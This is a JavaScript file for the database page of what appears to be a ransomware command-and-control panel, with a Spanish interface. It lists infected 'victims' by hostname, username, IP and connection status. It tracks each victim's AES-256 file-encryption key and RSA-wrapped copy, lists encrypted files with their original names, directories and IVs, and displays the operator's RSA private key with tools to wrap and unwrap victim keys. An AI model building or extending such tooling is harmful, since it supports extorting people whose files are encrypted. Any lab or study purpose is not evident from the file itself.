// ===============================
// DATABASE PAGE LOGIC
// ===============================

let currentTab = 'victims';
let allData = {
  victims: [],
  keys: [],
  encrypted: []
};
let sortColumn = null;
let sortDirection = 'desc';

document.addEventListener('DOMContentLoaded', () => {
  console.log('Database page loaded');

  // Tab switching
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentTab = btn.dataset.tab;
      sortColumn = null; // Reset sort when changing tabs
      renderTable();
    });
  });

  // Filter input
  document.getElementById('filterInput').addEventListener('input', renderTable);

  // Initial load
  refreshData();

  // Auto-refresh every 30 seconds
  setInterval(refreshData, 30000);
});

async function refreshData() {
  try {
    // Load stats
    const statsRes = await fetch('/api/db/stats');
    const stats = await statsRes.json();
    document.getElementById('statVictims').textContent = stats.victims || 0;
    document.getElementById('statKeys').textContent = stats.keys || 0;
    document.getElementById('statEncrypted').textContent = stats.encrypted || 0;

    // Load all data
    const [victimsRes, keysRes, encryptedRes] = await Promise.all([
      fetch('/api/db/victims'),
      fetch('/api/db/keys'),
      fetch('/api/db/encrypted')
    ]);

    const victimsData = await victimsRes.json();
    const keysData = await keysRes.json();
    const encryptedData = await encryptedRes.json();

    allData.victims = victimsData.data || [];
    allData.keys = keysData.data || [];
    allData.encrypted = encryptedData.data || [];

    // Load RSA keys
    try {
      const rsaRes = await fetch('/api/rsa-keys');
      const rsaData = await rsaRes.json();
      allData.rsa = rsaData;
    } catch (e) {
      console.log('Error loading RSA keys:', e);
      allData.rsa = {};
    }

    renderTable();
  } catch (e) {
    console.error('Error loading data:', e);
  }
}

function sortData(data, column) {
  if (!column) return data;

  return [...data].sort((a, b) => {
    let valA = a[column] || '';
    let valB = b[column] || '';

    // Handle dates
    if (column === 'created_at') {
      valA = new Date(valA).getTime();
      valB = new Date(valB).getTime();
    }

    if (typeof valA === 'string') valA = valA.toLowerCase();
    if (typeof valB === 'string') valB = valB.toLowerCase();

    if (sortDirection === 'asc') {
      return valA > valB ? 1 : valA < valB ? -1 : 0;
    } else {
      return valA < valB ? 1 : valA > valB ? -1 : 0;
    }
  });
}

function handleSort(column) {
  if (sortColumn === column) {
    sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
  } else {
    sortColumn = column;
    sortDirection = 'desc';
  }
  renderTable();
}

function renderTable() {
  const container = document.getElementById('tableContainer');
  const filter = document.getElementById('filterInput').value.toLowerCase();

  let data = allData[currentTab] || [];

  // Apply filter
  if (filter) {
    data = data.filter(row => {
      return Object.values(row).some(val =>
        String(val).toLowerCase().includes(filter)
      );
    });
  }

  // Apply sorting
  data = sortData(data, sortColumn);

  if (data.length === 0) {
    container.innerHTML = '<div class="no-data"><i class="ph ph-database" style="font-size:48px;"></i><p>No hay datos disponibles</p></div>';
    return;
  }

  let html = '';

  if (currentTab === 'victims') {
    html = renderVictimsTable(data);
  } else if (currentTab === 'keys') {
    html = renderKeysTable(data);
  } else if (currentTab === 'encrypted') {
    html = renderEncryptedTable(data);
  } else if (currentTab === 'rsa') {
    html = renderRSATab(allData.rsa);
  }

  container.innerHTML = html;
}

function renderRSATab(rsaData) {
  console.log('Rendering RSA Tab');
  if (!rsaData || !rsaData.publicKey) return '<div class="no-data"><p>No hay claves RSA disponibles</p></div>';

  return `
    <div style="padding: 20px;">
      <!-- Sección: Parámetros RSA para CrypTool v2 -->
      <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; margin-bottom:20px; border:1px solid #e9ecef;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
          <h3 style="margin:0; font-size:16px; color:var(--dark); display:flex; align-items:center; gap:8px;">
            <i class="ph ph-key" style="color:var(--primary);"></i> Parámetros RSA para CrypTool v2
          </h3>
          <button onclick="extractRSAParams()" class="copy-btn">
            <i class="ph ph-magnifying-glass"></i> Extraer
          </button>
        </div>
        <p style="margin:0 0 15px 0; font-size:11px; color:#666;">
          Usa estos valores en CrypTool para verificar el cifrado RSA. Padding: <strong style="color:var(--primary);">OAEP-SHA256</strong>
        </p>
        
        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:12px;">
          <!-- N (Módulo) -->
          <div style="background:#fff; padding:12px; border-radius:6px; border:1px solid #e9ecef;">
            <div style="font-size:10px; color:#888; margin-bottom:5px;">N (Módulo Público)</div>
            <div id="rsa-n-value" style="font-family:monospace; font-size:9px; color:#333; word-break:break-all; max-height:60px; overflow:auto;">Haz clic en Extraer</div>
            <button onclick="copyToClipboard(document.getElementById('rsa-n-value').textContent)" class="copy-btn" style="margin-top:8px; font-size:9px; padding:3px 6px;">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          
          <!-- e (Exponente Público) -->
          <div style="background:#fff; padding:12px; border-radius:6px; border:1px solid #e9ecef;">
            <div style="font-size:10px; color:#888; margin-bottom:5px;">e (Exponente Público)</div>
            <div id="rsa-e-value" style="font-family:monospace; font-size:13px; font-weight:bold; color:var(--dark);">65537</div>
            <div id="rsa-e-hex" style="font-family:monospace; font-size:10px; color:#888;">Hex: 010001</div>
            <button onclick="copyToClipboard(document.getElementById('rsa-e-value').textContent)" class="copy-btn" style="margin-top:8px; font-size:9px; padding:3px 6px;">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          
          <!-- d (Exponente Privado) -->
          <div style="background:#fff; padding:12px; border-radius:6px; border:1px solid #e9ecef;">
            <div style="font-size:10px; color:#888; margin-bottom:5px;">d (Exponente Privado)</div>
            <div id="rsa-d-value" style="font-family:monospace; font-size:9px; color:#c0392b; word-break:break-all; max-height:60px; overflow:auto;">Haz clic en Extraer</div>
            <button onclick="copyToClipboard(document.getElementById('rsa-d-value').textContent)" class="copy-btn" style="margin-top:8px; font-size:9px; padding:3px 6px;">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
        </div>
        
        <!-- Valores decimales colapsables -->
        <details style="margin-top:12px;">
          <summary style="cursor:pointer; font-size:11px; color:#666;">
            <i class="ph ph-caret-right"></i> Ver valores decimales completos
          </summary>
          <div style="margin-top:8px; display:grid; gap:8px;">
            <div style="background:#fff; padding:8px; border-radius:4px; border:1px solid #e9ecef;">
              <div style="font-size:9px; color:#888;">N (Decimal):</div>
              <div id="rsa-n-decimal" style="font-family:monospace; font-size:8px; color:#333; word-break:break-all; max-height:50px; overflow:auto;">Haz clic en "Extraer"</div>
            </div>
            <div style="background:#fff; padding:8px; border-radius:4px; border:1px solid #e9ecef;">
              <div style="font-size:9px; color:#888;">d (Decimal):</div>
              <div id="rsa-d-decimal" style="font-family:monospace; font-size:8px; color:#c0392b; word-break:break-all; max-height:50px; overflow:auto;">Requiere clave privada</div>
            </div>
          </div>
        </details>
        
        <!-- Sección: Verificar Cifrado/Descifrado RSA -->
        <div style="margin-top:20px; padding-top:15px; border-top:1px solid #e9ecef;">
          <h4 style="margin:0 0 10px 0; font-size:14px; color:var(--dark); display:flex; align-items:center; gap:8px;">
            <i class="ph ph-lock-key" style="color:var(--primary);"></i> Verificar Cifrado RSA
          </h4>
          
          <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
            <!-- Cifrar -->
            <div style="background:#fff; padding:15px; border-radius:8px; border:1px solid #e9ecef;">
              <h5 style="margin:0 0 10px 0; font-size:12px; color:var(--primary);">
                <i class="ph ph-lock"></i> Cifrar AES → RSA
              </h5>
              <label style="font-size:10px; color:#888; display:block; margin-bottom:4px;">Clave AES (64 hex)</label>
              <input type="text" id="aes-key-input" placeholder="Pega la clave AES aquí..." 
                style="width:100%; padding:8px; border:1px solid #e9ecef; border-radius:4px; font-family:monospace; font-size:10px; margin-bottom:8px;">
              <button onclick="encryptAESWithRSA()" class="copy-btn" style="width:100%; padding:8px;">
                <i class="ph ph-lock"></i> Cifrar
              </button>
              <label style="font-size:9px; color:#888; display:block; margin:10px 0 4px 0;">Resultado (Base64):</label>
              <div id="rsa-encrypt-result" style="background:#f8f9fa; padding:8px; border-radius:4px; font-family:monospace; font-size:8px; word-break:break-all; min-height:50px; max-height:70px; overflow:auto; color:#333;">
                -
              </div>
              <button onclick="copyToClipboard(document.getElementById('rsa-encrypt-result').textContent)" class="copy-btn" style="margin-top:6px; font-size:9px; padding:3px 6px;">
                <i class="ph ph-copy"></i> Copiar
              </button>
            </div>
            
            <!-- Descifrar -->
            <div style="background:#fff; padding:15px; border-radius:8px; border:1px solid #e9ecef;">
              <h5 style="margin:0 0 10px 0; font-size:12px; color:#c0392b;">
                <i class="ph ph-lock-open"></i> Descifrar RSA → AES
              </h5>
              <label style="font-size:10px; color:#888; display:block; margin-bottom:4px;">Clave Cifrada (Base64)</label>
              <input type="text" id="encrypted-aes-input" placeholder="Pega la clave cifrada aquí..." 
                style="width:100%; padding:8px; border:1px solid #e9ecef; border-radius:4px; font-family:monospace; font-size:10px; margin-bottom:8px;">
              <button onclick="decryptAESWithRSA()" class="copy-btn" style="width:100%; padding:8px; background:#c0392b;">
                <i class="ph ph-lock-open"></i> Descifrar
              </button>
              <label style="font-size:9px; color:#888; display:block; margin:10px 0 4px 0;">Resultado (AES Hex):</label>
              <div id="rsa-decrypt-result" style="background:#f8f9fa; padding:8px; border-radius:4px; font-family:monospace; font-size:10px; word-break:break-all; min-height:50px; max-height:70px; overflow:auto; color:#27ae60;">
                -
              </div>
              <button onclick="copyToClipboard(document.getElementById('rsa-decrypt-result').textContent)" class="copy-btn" style="margin-top:6px; font-size:9px; padding:3px 6px;">
                <i class="ph ph-copy"></i> Copiar
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- Claves PEM -->
      <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <!-- Public Key -->
        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h3 style="margin:0; font-size:16px; color:var(--dark);">Clave Pública RSA (PEM)</h3>
            <button onclick="copyToClipboard(\`${rsaData.publicKey}\`)" class="copy-btn">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          <pre id="rsa-public-pem" style="background:#1e1e2d; color:#50cd89; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.publicKey}</pre>
        </div>

        <!-- Private Key -->
        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h3 style="margin:0; font-size:16px; color:var(--dark);">Clave Privada RSA (PEM)</h3>
            <button onclick="copyToClipboard(\`${rsaData.privateKey}\`)" class="copy-btn">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          <pre id="rsa-private-pem" style="background:#1e1e2d; color:#f64e60; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.privateKey}</pre>
        </div>
      </div>
    </div>
  `;
}

function getSortIcon(column) {
  if (sortColumn !== column) return '<i class="ph ph-caret-up-down" style="opacity:0.3;"></i>';
  return sortDirection === 'asc'
    ? '<i class="ph ph-caret-up" style="color:var(--primary);"></i>'
    : '<i class="ph ph-caret-down" style="color:var(--primary);"></i>';
}

function renderVictimsTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('username')" style="cursor:pointer;">Usuario ${getSortIcon('username')}</th>
          <th onclick="handleSort('ip')" style="cursor:pointer;">IP ${getSortIcon('ip')}</th>
          <th onclick="handleSort('platform')" style="cursor:pointer;">SO ${getSortIcon('platform')}</th>
          <th onclick="handleSort('arch')" style="cursor:pointer;">Arch ${getSortIcon('arch')}</th>
          <th onclick="handleSort('status')" style="cursor:pointer;">Estado ${getSortIcon('status')}</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.username || '-'}</td>
            <td>${row.ip || '-'}</td>
            <td>${formatPlatform(row.platform)}</td>
            <td>${row.arch || '-'}</td>
            <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
            <td>${formatDate(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
                  <i class="ph ph-pencil-simple"></i>
                </button>
                <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderKeysTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('aes_key')" style="cursor:pointer;">Clave AES-256 ${getSortIcon('aes_key')}</th>
          <th>Clave Cifrada (RSA)</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td class="mono" style="max-width:350px;">
              <div style="display:flex; align-items:center; justify-content:space-between; gap:10px;">
                <span style="overflow:hidden; text-overflow:ellipsis;">${row.aes_key || '-'}</span>
              </div>
            </td>
            <td class="mono">
              ${row.encrypted_aes_key ? `
                <div style="display:flex; align-items:center; gap:8px;">
                  <span title="${row.encrypted_aes_key}" style="color:var(--success); font-size:10px;">
                    ${truncate(row.encrypted_aes_key, 15)}...
                  </span>
                  <button onclick="copyToClipboard('${row.encrypted_aes_key}')" class="copy-btn" title="Copiar Cifrada">
                    <i class="ph ph-copy"></i>
                  </button>
                  <button onclick="downloadKey('${row.hostname}_encrypted.bin', '${row.encrypted_aes_key}')" class="copy-btn" title="Descargar .bin">
                    <i class="ph ph-download-simple"></i>
                  </button>
                </div>
              ` : '<span style="color:#dcdcdc; font-style:italic;">No cifrada</span>'}
            </td>
            <td>${formatDate(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave AES">
                  <i class="ph ph-copy"></i>
                </button>
                <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
                  <i class="ph ph-pencil-simple"></i>
                </button>
                <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderEncryptedTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('file_name')" style="cursor:pointer;">Archivo ${getSortIcon('file_name')}</th>
          <th onclick="handleSort('original_name')" style="cursor:pointer;">Original ${getSortIcon('original_name')}</th>
          <th onclick="handleSort('directory')" style="cursor:pointer;">Directorio ${getSortIcon('directory')}</th>
          <th onclick="handleSort('iv')" style="cursor:pointer;">IV ${getSortIcon('iv')}</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 10)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.file_name || '-'}</td>
            <td>${row.original_name || '-'}</td>
            <td title="${row.directory || ''}" style="max-width:180px; overflow:hidden; text-overflow:ellipsis;">${truncate(row.directory, 30)}</td>
            <td class="mono" title="${row.iv || ''}">${truncate(row.iv, 16)}</td>
            <td>${formatDate(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button onclick="copyToClipboard('${row.iv}')" class="copy-btn" title="Copiar IV">
                  <i class="ph ph-copy"></i>
                </button>
                <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
                  <i class="ph ph-pencil-simple"></i>
                </button>
                <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function formatDate(dateStr) {
  if (!dateStr) return '-';
  const d = new Date(dateStr);
  return d.toLocaleDateString('es-ES') + ' ' + d.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

function formatPlatform(platform) {
  if (!platform) return '-';
  const labels = {
    'win32': 'Windows',
    'linux': 'Linux',
    'darwin': 'macOS'
  };
  return labels[platform] || platform;
}

function downloadKey(filename, b64Content) {
  try {
    const binaryString = window.atob(b64Content);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  } catch (e) {
    console.error('Download error:', e);
    alert('Error al descargar clave');
  }
}


function truncate(str, len) {
  if (!str) return '-';
  return str.length > len ? str.substring(0, len) + '...' : str;
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    // No alert for individual copies to avoid popup spam
  }).catch(err => {
    console.error('Error al copiar:', err);
  });
}

// ================================
// RSA Parameter Extraction for CrypTool v2
// ================================

async function extractRSAParams() {
  try {
    const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';
    const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';

    if (!publicPem) {
      alert('No hay claves RSA disponibles');
      return;
    }

    // Parse public key
    const publicKey = await importRSAPublicKey(publicPem);
    const exportedPublic = await crypto.subtle.exportKey('jwk', publicKey);

    // Extract N and e from public key
    const n = base64UrlToHex(exportedPublic.n);
    const e = base64UrlToHex(exportedPublic.e);
    const nDecimal = base64UrlToBigInt(exportedPublic.n).toString();
    const eDecimal = base64UrlToBigInt(exportedPublic.e).toString();

    // Update UI
    document.getElementById('rsa-n-value').textContent = n;
    document.getElementById('rsa-n-decimal').textContent = nDecimal;
    document.getElementById('rsa-e-value').textContent = eDecimal;
    document.getElementById('rsa-e-hex').textContent = `Hex: ${e}`;

    // Try to parse private key for d
    if (privatePem) {
      try {
        const privateKey = await importRSAPrivateKey(privatePem);
        const exportedPrivate = await crypto.subtle.exportKey('jwk', privateKey);

        const d = base64UrlToHex(exportedPrivate.d);
        const dDecimal = base64UrlToBigInt(exportedPrivate.d).toString();

        document.getElementById('rsa-d-value').textContent = d;
        document.getElementById('rsa-d-decimal').textContent = dDecimal;
      } catch (privErr) {
        console.log('Could not extract d from private key:', privErr);
        document.getElementById('rsa-d-value').textContent = 'Error al extraer';
      }
    }

    console.log('RSA Parameters extracted successfully');

  } catch (err) {
    console.error('Error extracting RSA params:', err);
    alert('Error al extraer parámetros: ' + err.message);
  }
}

async function importRSAPublicKey(pem) {
  const pemContents = pem
    .replace(/-----BEGIN PUBLIC KEY-----/, '')
    .replace(/-----END PUBLIC KEY-----/, '')
    .replace(/\s/g, '');

  const binaryDer = Uint8Array.from(atob(pemContents), c => c.charCodeAt(0));

  return await crypto.subtle.importKey(
    'spki',
    binaryDer.buffer,
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    true,
    ['encrypt']
  );
}

async function importRSAPrivateKey(pem) {
  const pemContents = pem
    .replace(/-----BEGIN PRIVATE KEY-----/, '')
    .replace(/-----END PRIVATE KEY-----/, '')
    .replace(/-----BEGIN RSA PRIVATE KEY-----/, '')
    .replace(/-----END RSA PRIVATE KEY-----/, '')
    .replace(/\s/g, '');

  const binaryDer = Uint8Array.from(atob(pemContents), c => c.charCodeAt(0));

  return await crypto.subtle.importKey(
    'pkcs8',
    binaryDer.buffer,
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    true,
    ['decrypt']
  );
}

function base64UrlToHex(base64url) {
  // Convert base64url to base64
  let base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) base64 += '=';

  // Decode and convert to hex
  const binary = atob(base64);
  let hex = '';
  for (let i = 0; i < binary.length; i++) {
    hex += binary.charCodeAt(i).toString(16).padStart(2, '0');
  }
  return hex;
}

function base64UrlToBigInt(base64url) {
  const hex = base64UrlToHex(base64url);
  return BigInt('0x' + hex);
}

// Encrypt AES key with RSA for verification
async function encryptAESWithRSA() {
  try {
    const aesKeyHex = document.getElementById('aes-key-input')?.value?.trim();
    const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';

    if (!aesKeyHex) {
      alert('Ingresa una clave AES (64 caracteres hex)');
      return;
    }

    if (aesKeyHex.length !== 64) {
      alert(`La clave AES debe tener 64 caracteres. Tienes: ${aesKeyHex.length}`);
      return;
    }

    if (!publicPem) {
      alert('No hay clave pública RSA disponible');
      return;
    }

    // Convert hex to bytes
    const aesKeyBytes = new Uint8Array(aesKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));

    // Import public key
    const publicKey = await importRSAPublicKey(publicPem);

    // Encrypt with RSA-OAEP
    const encrypted = await crypto.subtle.encrypt(
      { name: 'RSA-OAEP' },
      publicKey,
      aesKeyBytes
    );

    // Convert to base64
    const encryptedBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));

    // Display result
    document.getElementById('rsa-encrypt-result').textContent = encryptedBase64;

    console.log('AES key encrypted successfully');

  } catch (err) {
    console.error('Error encrypting AES key:', err);
    document.getElementById('rsa-encrypt-result').textContent = 'Error: ' + err.message;
  }
}

// Decrypt AES key with RSA private key for verification
async function decryptAESWithRSA() {
  try {
    const encryptedBase64 = document.getElementById('encrypted-aes-input')?.value?.trim();
    const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';

    if (!encryptedBase64) {
      alert('Ingresa la clave cifrada (Base64)');
      return;
    }

    if (!privatePem) {
      alert('No hay clave privada RSA disponible');
      return;
    }

    // Convert base64 to bytes
    const encryptedBytes = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

    // Import private key
    const privateKey = await importRSAPrivateKey(privatePem);

    // Decrypt with RSA-OAEP
    const decrypted = await crypto.subtle.decrypt(
      { name: 'RSA-OAEP' },
      privateKey,
      encryptedBytes
    );

    // Convert to hex
    const decryptedHex = Array.from(new Uint8Array(decrypted))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');

    // Display result
    document.getElementById('rsa-decrypt-result').textContent = decryptedHex;

    console.log('AES key decrypted successfully');

  } catch (err) {
    console.error('Error decrypting AES key:', err);
    document.getElementById('rsa-decrypt-result').textContent = 'Error: ' + err.message;
  }
}

// Global functions for onclick handlers
window.refreshData = refreshData;
window.handleSort = handleSort;
window.copyToClipboard = copyToClipboard;
window.extractRSAParams = extractRSAParams;
window.downloadKey = downloadKey;
window.encryptAESWithRSA = encryptAESWithRSA;
window.decryptAESWithRSA = decryptAESWithRSA;
